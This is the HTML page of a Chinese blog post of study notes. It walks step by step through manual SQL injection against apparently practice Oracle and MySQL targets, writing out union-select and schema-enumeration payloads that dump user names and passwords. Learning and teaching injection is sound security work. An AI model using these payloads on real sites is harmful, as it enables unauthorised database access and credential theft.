@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="第六节：ORACLE数据库注入及防御Oracle安全配置Oracle实战注入 判断是否存在注入点，报错即存在    让我们多试一下 同时我们也可以看出此注入点的诸如参数类型 80% 是数字型   确定数据库类型   由于已知是Oracle数据库，我们采用 1(select count(*) from dual)   &amp;gt; 0          //dual 是Oracle特有的数据表，存在则页">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle学习">
+<meta property="og:url" content="http://yoursite.com/2018/12/11/ORACLE数据库注入及防御/index.html">
+<meta property="og:site_name" content="ZouKba">
+<meta property="og:description" content="第六节：ORACLE数据库注入及防御Oracle安全配置Oracle实战注入 判断是否存在注入点，报错即存在    让我们多试一下 同时我们也可以看出此注入点的诸如参数类型 80% 是数字型   确定数据库类型   由于已知是Oracle数据库，我们采用 1(select count(*) from dual)   &amp;gt; 0          //dual 是Oracle特有的数据表，存在则页">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-16e149f941d02e0a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-2deee1c55ec62762.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-23f51a3fc3cef67e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-3d62d3f2800b8dde.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-221dc91e52b7ad15.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-9b2ee8c13d6ca15f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-b5287ed5401628c7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-16250e0e7a9b8f1a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-e2fd07da1b15d08c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-87254fcdb5621373.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-30c46f3c9cb1706f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-c090696c8d4f9dff.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-19468956572d14bb.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-af52133f927d6bba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-329cddd24b776d30.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-9268dddeb2f38b7d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-537eb21a8ef76060.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-a278c0d865ece160.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-6212ba0d8b3aa3f8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-55e5e7b6ae2f159f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-2dc976364d9caaf1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-688505c012f23f36.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-cf1f76b319aaf69c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-92a7f0a5b9d21d51.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-ef6cb1f3b1caefc6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-d5c89aaadafe0566.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11457450-68a72ed33186684d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-19T09:03:30.023Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Oracle学习">
+<meta name="twitter:description" content="第六节：ORACLE数据库注入及防御Oracle安全配置Oracle实战注入 判断是否存在注入点，报错即存在    让我们多试一下 同时我们也可以看出此注入点的诸如参数类型 80% 是数字型   确定数据库类型   由于已知是Oracle数据库，我们采用 1(select count(*) from dual)   &amp;gt; 0          //dual 是Oracle特有的数据表，存在则页">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11457450-16e149f941d02e0a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZouKba" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/11/ORACLE数据库注入及防御/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Oracle学习 | ZouKba</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZouKba</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">别偷懒</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">14</span></a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/11/ORACLE数据库注入及防御/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zoukba">
+      <meta itemprop="description" content="阿里我来了">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZouKba">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Oracle学习
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-11 16:47:52" itemprop="dateCreated datePublished" datetime="2018-12-11T16:47:52+08:00">2018-12-11</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-12-19 17:03:30" itemprop="dateModified" datetime="2018-12-19T17:03:30+08:00">2018-12-19</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="第六节：ORACLE数据库注入及防御"><a href="#第六节：ORACLE数据库注入及防御" class="headerlink" title="第六节：ORACLE数据库注入及防御"></a>第六节：ORACLE数据库注入及防御</h1><h2 id="Oracle安全配置"><a href="#Oracle安全配置" class="headerlink" title="Oracle安全配置"></a>Oracle安全配置</h2><h2 id="Oracle实战注入"><a href="#Oracle实战注入" class="headerlink" title="Oracle实战注入"></a>Oracle实战注入</h2><ol>
+<li><strong>判断是否存在注入点，报错即存在</strong><br> <img src="https://upload-images.jianshu.io/upload_images/11457450-16e149f941d02e0a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"></li>
+</ol>
+<ul>
+<li><strong>让我们多试一下</strong><br><img src="https://upload-images.jianshu.io/upload_images/11457450-2deee1c55ec62762.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br><img src="https://upload-images.jianshu.io/upload_images/11457450-23f51a3fc3cef67e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"></li>
+<li><strong>同时我们也可以看出此注入点的诸如参数类型 80% 是数字型</strong></li>
+</ul>
+<ol start="2">
+<li><strong>确定数据库类型</strong></li>
+</ol>
+<ul>
+<li>由于已知是Oracle数据库，我们采用 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select count(*) from dual)   &gt; 0          //dual 是Oracle特有的数据表，存在则页面返回正常</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-3d62d3f2800b8dde.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"></p>
+<ol start="3">
+<li><strong>确定字段数</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by                       //语句特点是排序</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-221dc91e52b7ad15.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-9b2ee8c13d6ca15f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"></p>
+<ul>
+<li><strong>2的时候返回正常3的时候则出错，说明可供注入的字段数为2</strong></li>
+</ul>
+<ol start="4">
+<li><strong>判断回显位置</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 from dual</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-b5287ed5401628c7.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></p>
+<ul>
+<li><p><strong>上图发现报错了，于是我们给1，2加上‘’，假设他是个字符型</strong><br><img src="https://upload-images.jianshu.io/upload_images/11457450-16250e0e7a9b8f1a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.PNG"></p>
+</li>
+<li><p><strong>原来我是那个20% 以及需要把 aLL 去掉</strong><br><img src="https://upload-images.jianshu.io/upload_images/11457450-e2fd07da1b15d08c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.PNG"></p>
+</li>
+</ul>
+<ol start="5">
+<li><strong>获取数据库名</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select instance_name from v$instance)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-87254fcdb5621373.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.PNG"></p>
+<ol start="6">
+<li><strong>获取表名</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from user_tables where rownum=1            //rownum=1,是让他输出一项数据</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-30c46f3c9cb1706f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.PNG"></p>
+<ul>
+<li><strong>虽然得到了一个表，但是显然这个表不是我们想要的</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like &apos;%user%&apos;               //使用相似查询，查询敏感数据</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-c090696c8d4f9dff.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.PNG"></p>
+<ol start="7">
+<li>获取列名</li>
+</ol>
+<ul>
+<li>因为我们有两个字段，可以充分利用这两个字段<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name from user_tab_columns where rownum = 1 and table_name=&apos;sns_users&apos;</span><br><span class="line">select column_name from user_tab_columns where rownum = 1 and table_name=&apos;sns_users&apos; and (column_name like &apos;%P%&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-19468956572d14bb.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.PNG"></p>
+<ol start="8">
+<li><strong>获取关键字信息</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select USER_NAME,USER_PWD from &quot;sns_users&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-af52133f927d6bba.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.PNG"></p>
+<ul>
+<li>发现又不是想要的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ where user_name &lt;&gt; &apos;hu&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-329cddd24b776d30.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.PNG"></p>
+<h2 id="MySQL实战注入"><a href="#MySQL实战注入" class="headerlink" title="MySQL实战注入"></a>MySQL实战注入</h2><p>1.<strong>确定是否为注入点</strong><br><img src="https://upload-images.jianshu.io/upload_images/11457450-9268dddeb2f38b7d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"></p>
+<ul>
+<li>出现了MQo=,经过判断是采用了base64加密<br><img src="https://upload-images.jianshu.io/upload_images/11457450-537eb21a8ef76060.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"></li>
+<li>还是采用 and 1=1<br><img src="https://upload-images.jianshu.io/upload_images/11457450-a278c0d865ece160.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"></li>
+</ul>
+<ol start="2">
+<li>**确定数据库类型，已知是mysql<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables &gt; 0       //mysql的特殊数据表是 information_schema.(schemata,tables,columns)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-6212ba0d8b3aa3f8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"></p>
+<ol start="3">
+<li><strong>确定诸如参数类型</strong></li>
+</ol>
+<ul>
+<li><strong>由于测试注入点时，已经测试出此注入点80%为数字型</strong><br>4.确定字段数<br><img src="https://upload-images.jianshu.io/upload_images/11457450-55e5e7b6ae2f159f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br><img src="https://upload-images.jianshu.io/upload_images/11457450-2dc976364d9caaf1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"></li>
+</ul>
+<ol start="5">
+<li><strong>判断回显位置</strong></li>
+</ol>
+<ul>
+<li>需要注意的是在使用union select联合查询的时候要让前面的id=报错，我采用的是id=-1<br><img src="https://upload-images.jianshu.io/upload_images/11457450-688505c012f23f36.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></li>
+</ul>
+<p>6.<strong>获取数据库名</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database()                    //是获取当前数据库函数</span><br><span class="line">version()                       //是获取其主机以及MySQL数据库版本函数</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-cf1f76b319aaf69c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.PNG"></p>
+<ol start="7">
+<li><strong>获取表名</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group_concat()            //推荐使用此函数能将相同字段下的值打印在一行内</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-92a7f0a5b9d21d51.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.PNG"></p>
+<ol start="8">
+<li><strong>获取列名</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=database() and table_name=&apos;data&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-ef6cb1f3b1caefc6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.PNG"></p>
+<ul>
+<li>data 需要加上’’，不然会出现错误<br><img src="https://upload-images.jianshu.io/upload_images/11457450-d5c89aaadafe0566.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="‘data’.PNG"></li>
+</ul>
+<ol start="9">
+<li><strong>获取关键信息</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat_ws()                                 //连接函数</span><br><span class="line">select concat_ws(&apos;:&apos;,id,thekey) from data</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/11457450-68a72ed33186684d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.PNG"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
+<li>要熟知不同数据库的特殊库，特殊表</li>
+</ul>
+<ol>
+<li><p><strong>Oracle 拥有dual 里面只有一行数据</strong></p>
+<ul>
+<li>instance_name    输出数据库名字</li>
+<li>v$instance           存放数据库的表</li>
+<li>table_name          表名</li>
+<li>user_tables         存放表名的表</li>
+<li>column_name     列名</li>
+<li>user_tab_columns  存放列的表</li>
+</ul>
+</li>
+<li><p><strong>MySQL</strong></p>
+<ul>
+<li>information_schema.schemata，tables，columns        存放数据库，表，列的表</li>
+<li>table_schema=        需要查询表的数据库</li>
+<li>table_name=            需要查询表的表名<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><strong>There is not a heart but has its moments of longing, yearning for something better, nobler and holier than it knows before.</strong></li>
+</ul>
+</li>
+</ol>
+<p>每个人都有向往的时候，渴望比以前更美好，更高贵，更神圣的东西。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/10/mysql学习/" rel="next" title="MySQL学习">
+                <i class="fa fa-chevron-left"></i> MySQL学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/12/注入实战/" rel="prev" title="注入实战">
+                注入实战 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="zoukba">
+            
+              <p class="site-author-name" itemprop="name">zoukba</p>
+              <p class="site-description motion-element" itemprop="description">阿里我来了</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
